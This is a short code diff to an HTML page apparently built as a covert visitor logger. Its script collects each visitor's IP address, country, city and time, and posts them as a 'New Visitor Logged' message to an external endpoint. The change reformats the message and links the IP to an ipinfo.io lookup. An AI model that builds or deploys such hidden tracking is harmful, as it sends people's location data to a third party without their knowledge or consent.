@@ -22,13 +22,13 @@
           headers: {
             'Content-Type': 'application/json'
           },
-          body: JSON.stringify({
-            content:
+body: JSON.stringify({
+  content:
 `📥 **New Visitor Logged**
-🌐 **IP:** ${ip}
+🌐 **IP:** https://ipinfo.io/${ip}
 🏙️ **Location:** ${country} - ${city}
 🕒 **Time:** ${dateTime}`
-          })
+})
         });
       })
       .catch(err => console.error(err));
@@ -38,3 +38,4 @@
 <body>
 </body>
 </html>
+
